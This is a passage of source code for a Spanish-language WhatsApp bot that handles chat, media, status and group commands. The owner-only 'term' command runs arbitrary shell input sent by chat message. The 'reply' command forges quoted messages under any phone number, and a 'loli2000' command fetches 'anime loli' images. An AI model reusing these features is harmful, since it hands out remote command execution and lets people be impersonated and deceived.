					.catch((err) => wa.sendFakeStatus2(from, JSON.stringify(err), fake))
				break
			case 'setreply':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				if (!arg) return reply(`Uso: ${prefix}setreply texto`)
				fake = arg
				wa.sendFakeStatus2(from, `𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒`, fake)
				break
			case 'term':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				if (!arg) return
				exec(arg, (err, stdout) => {
					if (err) return reply(err)
					if (stdout) reply(stdout)
				})
				break
			case 'contacto':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				argz = arg.split('|')
				if (!argz) return reply(`Uso ${prefix}contacto @tag o escribe el numero|nombre`)
				if (sam.message.extendedTextMessage != undefined) {
					mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
					wa.sendKontak(from, mentioned[0].split('@')[0], argz[1])
				} else {
					wa.sendKontak(from, argz[0], argz[1])
				}
				break

			case 'runtime':
				run = process.uptime()
				let text = msg.runtime(run)
				samu330.sendMessage(from, '*Tiempo encendido*', MessageType.text, {
					quoted: {
						key: {
							fromMe: false,
							participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
						},
						message: {
							"productMessage": {
								"product": {
									"title": `${text}`,
									"description": "",
									"currencyCode": "SYP",
									"priceAmount1000": "999999999999999999",
									"retailerId": "𝒩𝓎𝒶𝓃ℬ𝑜𝓉🍃",
									"productImageCount": 10
								},
								"businessOwnerJid": `0@s.whatsapp.net`
							}
						}
					}
				})
				break
			case 'desfijar':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				samu330.modifyChat(from, ChatModification.unpin)
				reply('*succes unpin this chat*')
				console.log('unpin chat = ' + from)
				break
			case 'fijar':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				samu330.modifyChat(from, ChatModification.pin)
				reply('*Este chat se ah fijado*')
				console.log('Se fijo el chat = ' + from)
				break
			case 'sinleer':
				const unread = await samu330.loadAllUnreadMessages()
				samu330.sendMessage(from, `Total de mensajes sin leer: ${unread.length}`, MessageType.text)

				break
			case 'desarchivar':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				reply('*Todos los chats archivados fueron desarchivados*')
				console.log('succes unarchive chat = ' + from)
				anu = await samu330.chats.all()
				for (let _ of anu) {
					samu330.modifyChat(_.jid, ChatModification.unarchive)
				}
				break
			case 'archivar':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				reply('*Vale, espera..*')
				console.log('succes archive chat = ' + from)
				await sleep(3000)
				samu330.modifyChat(from, ChatModification.archive)
				reply('*Yap*')
				break
			case 'vaciartodo':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				reply('*Todos los chats han sido vaciados*')
				smyprry = await samu330.chats.all()
				for (let _ of smyprry) {
					await sleep(4000)
					samu330.modifyChat(_.jid, ChatModification.delete)
				}
				break
			case 'vaciar':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				reply('*Este chat a sido vaciado*')
				console.log('succes delete chat = ' + from)
				await sleep(4000)
				samu330.modifyChat(from, ChatModification.delete)
				break
			case 'silencio':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				samu330.modifyChat(from, ChatModification.mute, 24 * 60 * 60 * 1000)
				reply('*Este chat a sido silenciado*')
				console.log('succes mute chat = ' + from)
				break
			case 'desilenciar':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				samu330.modifyChat(from, ChatModification.unmute)
				reply('*Este chat a dejado de silenciarse*')
				console.log('succes unmute chat = ' + from)
				break
			case 'loli2000':
				if (!isRegister) return reply(mess.only.usrReg)

				samu330.updatePresence(from, Presence.composing)
				uk = ["anime loli"]
				nk = uk[Math.floor(Math.random() * uk.length)]
				try {
					data = await getJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
						method: 'get'
					})
					reply(mess.wait)
					n = JSON.parse(JSON.stringify(data));
					nimek = n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					samu330.sendMessage(from, pok, image, {
						quoted: fimg, contextInfo: { "forwardingScore": 9999, "isForwarded": true }
					})

				} catch {
					reply(mess.ferr)
				}
				break
				
			
			case 'neko2000':
				if (!isRegister) return reply(mess.only.usrReg)

				samu330.updatePresence(from, Presence.composing)
				uk = ["anime neko"]
				nk = uk[Math.floor(Math.random() * uk.length)]
				try {
					data = await getJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
						method: 'get'
					})
					reply(mess.wait)
					n = JSON.parse(JSON.stringify(data));
					nimek = n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					samu330.sendMessage(from, pok, image, {
						quoted: fimg, contextInfo: { "forwardingScore": 9999, "isForwarded": true }
					})

				} catch {
					reply(mess.ferr)
				}
			break
			case 'play':

				if (!isRegister) return reply(mess.only.usrReg)
				if (args.length == 0) return reply(`*Agrega lo que deseas buscar.*\nPor ejemplo: ${prefix + command} Green day Holiday`)
				reply('*Espere un momento por favor...*')
				query = args.join(' ')
				fakee = fs.readFileSync('./src/img.jpg')
				try {
					get_result = await getJson(`https://api.lolhuman.xyz/api/ytplay2?apikey=${api}&query=${query}`)
					get_result = get_result.result
					short = await getJson(`https://api.lolhuman.xyz/api/shortlink?apikey=${api}&url=${get_result.audio}`)
					ini_txt = `Titulo : ${get_result.title}\n\n`
					ini_txt += `_Si el audio no llega, puedes descargarlo mediante el siguiente link_ :\n ${short.result}`
					ini_buffer = await getBuffer(get_result.thumbnail)
					await samu330.sendMessage(from, ini_buffer, image, { quoted: faud, caption: ini_txt, contextInfo: { "forwardingScore": 9999, "isForwarded": true } })
					get_audio = await getBuffer(get_result.audio)
					await samu330.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', quoted: faud, duration: -999999 })
				} catch {
					reply(`*Ocurrió un problema, puedes descargar del link mencionado en el mensaje anterior o intentarlo nuevamente más tarde.*`)
				}
			break
			case 'playvid':

				if (!isRegister) return reply(mess.only.usrReg)
				if (args.length == 0) return reply(`*Agrega lo que deseas buscar.*\nPor ejemplo: ${prefix + command} Green day Holiday`)
				reply('*Espere un momento por favor...*')
				query = args.join(' ')
				fakee = fs.readFileSync('./src/img.jpg')
				try {
					get_result = await getJson(`https://api.lolhuman.xyz/api/ytplay2?apikey=${api}&query=${query}`)
					get_result = get_result.result
					short = await getJson(`https://api.lolhuman.xyz/api/shortlink?apikey=${api}&url=${get_result.video}`)
					ini_txt = `Titulo : ${get_result.title}\n\n`
					ini_txt += `_Si el video no llega, puedes descargarlo mediante el siguiente link_ :\n ${short.result}`
					ini_buffer = await getBuffer(get_result.thumbnail)
					await samu330.sendMessage(from, ini_buffer, image, { quoted: fvid, caption: ini_txt, contextInfo: { "forwardingScore": 9999, "isForwarded": true } })
					get_video = await getBuffer(get_result.video)
					await samu330.sendMessage(from, get_video, video, { mimetype: 'video/mp4', quoted: fvid, duration: -999999 })
				} catch {
					reply(`*Ocurrió un problema, puedes descargar del link mencionado en el mensaje anterior o intentarlo nuevamente más tarde.*`)
				}
			break
			case 'playvidgif':

				if (!isRegister) return reply(mess.only.usrReg)
				if (args.length == 0) return reply(`*Agrega lo que deseas buscar.*\nPor ejemplo: ${prefix + command} Green day Holiday`)
				reply('*Espere un momento por favor...*')
				query = args.join(' ')
				fakee = fs.readFileSync('./src/img.jpg')
				try {
					get_result = await getJson(`https://api.lolhuman.xyz/api/ytplay2?apikey=${api}&query=${query}`)
					get_result = get_result.result
					short = await getJson(`https://api.lolhuman.xyz/api/shortlink?apikey=${api}&url=${get_result.video}`)
					ini_txt = `Titulo : ${get_result.title}\n\n`
					ini_txt += `_Si el video no llega, puedes descargarlo mediante el siguiente link_ :\n ${short.result}`
					ini_buffer = await getBuffer(get_result.thumbnail)
					await samu330.sendMessage(from, ini_buffer, image, { quoted: fvid, caption: ini_txt, contextInfo: { "forwardingScore": 9999, "isForwarded": true } })
					get_video = await getBuffer(get_result.video)
					await samu330.sendMessage(from, get_video, video, { mimetype: Mimetype.gif, duration: -999999999999999, filename: `${get_result.title}.mp4`, quoted: fvid })
				} catch {
					reply(`*Ocurrió un problema, puedes descargar del link mencionado en el mensaje anterior o intentarlo nuevamente más tarde.*`)
				}
			break
			
			case 'facebook':
			case 'fb':
				if (args.length < 1) return reply('Y el link? ')
				if (!isUrl(args[0]) && !args[0].includes('facebook')) return reply('LINK DE FACEBOOK MLDT STUPID!!')
				teks = args.join(' ')
				reply(mess.wait)
				res = await fbDown(teks).catch(e => {
					reply(mess.ferr)
				})
				a = res[0]
				result = `
Titulo :* ${a.judul}
*Source :* ${a.source}
*Tamaño :* ${a.size}
*Calidad :* ${a.quality}
*Tipo :* ${a.type}
*Name File :* ${a.judul}.${a.type}
`
				sendFileFromUrl(a.thumb, image, { caption: result, quoted: sam })
				sendFileFromUrl(a.link, video, { mimetype: 'video/mp4', quoted: sam, filename: `${a.judul}.${a.type}` })
				break
			case 'ytsearch':

				if (args.length == 0) return reply(`Ejemplo: ${prefix + command} Me olvide de vivir`)
				query = args.join(' ')
				try {
					get_result = await getJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${api}&query=${query}`)
					get_result = get_result.result
					ini_txt = ""
					for (var x of get_result) {
						ini_txt += `*◦Titulo* : ${api} ${x.title}\n`
						ini_txt += `*◦Vistas* : ${x.views}\n`
						ini_txt += `◦Publicado el ${x.published}\n`
						ini_txt += `📸Thumbnail : ${x.thumbnail}\n`
						ini_txt += `📲Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
					}
					reply(ini_txt)
				} catch {
					reply(`Servidor *1* con problemas, realizando tu busqueda de *${q}* en el servidor *2*`)
					res = await yts(q)
					searchyt = ``
					for (let i of res.all) {
						searchyt += `
*Titulo :* ${i.title}
*ID Video :* ${i.videoId}
*Vistas :* ${i.views}
*Subido :* ${i.ago}
*Duracion :* ${i.timestamp}
*Channel :* ${i.author.name}
*Link Channel :* ${i.author.url}
*Link Video :* ${i.url}
`
					}
					var samusamuxd = searchyt.trim()
					sendFileFromUrl(res.all[0].image, image, { quoted: fimg, caption: samusamuxd, sendEphemeral: true })
				}
				break
			case 'tts':
			case 'voz':
				if (args.length < 1) return samu330.sendMessage(from, 'Y el codigo de idioma? escribe el comando *idiomas* para ver la lista', text, { quoted: ftoko })
				const gtts = require('./lib/gtts')(args[0])
				if (args.length < 2) return samu330.sendMessage(from, 'Escribe el texto', text, { quoted: floc })
				dtt = body.slice(8)
				ranm = getRandom('.mp3')
				rano = getRandom('.ogg')
				dtt.length > 300
					? reply('Mira, si no sabes usar esto... mejor no lo agas 😤')
					: gtts.save(ranm, dtt, function () {
						samu330.updatePresence(from, Presence.recording)
						samu330.sendMessage(from, fs.readFileSync(ranm), audio, { quoted: fliveLoc, mimetype: 'audio/mp4', duration: -999999999999999999, ptt: true, sendEphemeral: true, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
						fs.unlinkSync(ranm)
					})

				break
			case 'estadopic':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				var textodestatusxd = args.join(' ')
				reply('*Espera un momento...*')
				var foto = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
				var inisiap = await samu330.downloadAndSaveMediaMessage(foto)
				var inisiap2 = fs.readFileSync(inisiap)
				samu330.sendMessage('status@broadcast', inisiap2, MessageType.image, { quoted: ftoko, caption: `${textodestatusxd}` })
				reply('*SE ENVIO LA IMAGEN COMO ESTADO*')
				break
			case 'estadovid':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				reply('*Espera un momento...*')
				var foto = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
				var inisiap = await samu330.downloadAndSaveMediaMessage(foto)
				var inisiap2 = fs.readFileSync(inisiap)
				samu330.sendMessage('status@broadcast', inisiap2, MessageType.video, { quoted: ftoko, caption: `${body.slice(12)}` })
				reply('Se envio el video al estado!')
				break
			case 'estado':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				var estadotxt = args.join(' ')
				samu330.sendMessage('status@broadcast', estadotxt, MessageType.text)
				reply('*SE ENVIO EL ESTADO*')
				break
			case 'marcarsinleer':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				var chats = await samu330.chats.all()
				chats.map(async ({ jid }) => {
					await samu330.chatRead(jid, 'unread')
				})
				var teks = `\`\`\`Se an marcado como NO LEIDOS ${chats.length} chats !\`\`\``
				await samu330.sendMessage(from, teks, MessageType.text, { quoted: fdoc })
				console.log(chats.length)
				break
			case 'leertodo':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				var chats = await samu330.chats.all()
				chats.map(async ({ jid }) => {
					await samu330.chatRead(jid)
				})
				var teks = `\`\`\`Se an leido ${chats.length} chats !\`\`\``
				await samu330.sendMessage(from, teks, MessageType.text, { quoted: floc })
				console.log(chats.length)
				break
			case 'reply':
				if (!args) return reply(`Uso :\n${prefix}reply [52xxx|frase|frase]]\n\nEx : \n${prefix}reply 0|hola wasa|que pex`)
				var ghh = args.join(' ')
				var nomorr = ghh.split("|")[0];
				var target = ghh.split("|")[1];
				var bot = ghh.split("|")[2];
				samu330.sendMessage(from, `${bot}`, MessageType.text, { quoted: { key: { fromMe: false, participant: nomorr + '@s.whatsapp.net', ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` } } })
				break
			case 'fordward':
				samu330.sendMessage(from, `${budy.slice(10)}`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true } })
				break

			case 'todos':
				samu330.updatePresence(from, Presence.composing)
				if (!isGroup) return reply(mess.only.group)
				if (!isRegister) return reply(mess.only.usrReg)
				if (!isAdmin) return reply(mess.only.admin)
				members_id = []
				teks = (args.length > 1) ? body.slice(8).trim() : ''
				teks += `  Total : ${groupMembers.length}\n`
				for (let mem of groupMembers) {
					teks += `┃ @${mem.jid.split('@')[0]}\n`
					members_id.push(mem.jid)
				}
				mentions('[  *TAGALL* ]\n┏━━━━━━━━━━━━━━━━━━━━\n┠ ►' + teks + '┃━━━━━━━━━━━━━━━━━━━━\n┃────🪀 *Samu330* 🪀────\n┗━━━━━━━━━━━━━━━━━━━━', members_id, true)

				break
			case 'notificar':

				if (!isAdmin) return reply(mess.only.admin)
				samu330.updatePresence(from, Presence.composing)
				if (!isRegister) return reply(mess.only.usrReg)
				if (!isGroup) return reply(mess.only.group)
				teks = `Notificación dada por @${sender.split("@")[0]}\n*Mensaje : ${args.join(' ')}*`
				const groupN = await samu330.groupMetadata(from);
				member = groupN['participants']
				jids = [];
				member.map(async adm => {
					jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
				})
				options = {
					text: teks,
					contextInfo: {
						mentionedJid: jids, "forwardingScore": 9999, "isForwarded": true
					},
					quoted: faud
				}
				await samu330.sendMessage(from, options, MessageType.text)
				break
			case 'leermas':
				samu330.updatePresence(from, Presence.composing)
				if (!isRegister) return reply(mess.only.usrReg)

				if (args.length < 1) return reply(`Escribe el texto\nEjemplo : ${prefix}readmore te amo/rdido un perro?`)
				tels = body.slice(9)
				var teksa = tels.split("/")[0];
				var teks2 = tels.split("/")[1];
				hasil = `${teksa}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏